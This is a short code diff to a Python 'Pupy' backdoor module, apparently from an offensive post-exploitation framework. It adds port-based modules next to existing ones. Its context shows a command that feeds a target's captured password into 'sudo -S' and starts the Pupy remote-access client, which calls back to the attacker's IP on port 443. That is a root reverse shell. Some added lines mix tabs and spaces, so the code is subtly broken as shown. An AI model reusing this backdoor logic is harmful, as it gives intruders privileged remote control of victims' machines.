@@ -11,7 +11,11 @@ class Pupy(Backdoor):
                 "port"   : Option("port", 53923, "port to connect to", True),
                 }
         self.modules = {} 
-        self.allow_modules = True
+        self.portModules = {}
+	self.allow_modules = True
+
+    def get_port(self):
+        return self.get_value("port")
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S python ~/pupy/pp.py simple --host " + self.core.localIP + ":443"
@@ -33,3 +37,7 @@ class Pupy(Backdoor):
         for mod in self.modules.keys():
             print(INFO + "Attempting to execute " + mod.name + " module...")
             mod.exploit(self.get_command())
+	for mod in self.portModules.keys():
+            print(INFO + "Attempting to execute " + mod.name + " module...")
+            mod.exploit(self.get_port())
+
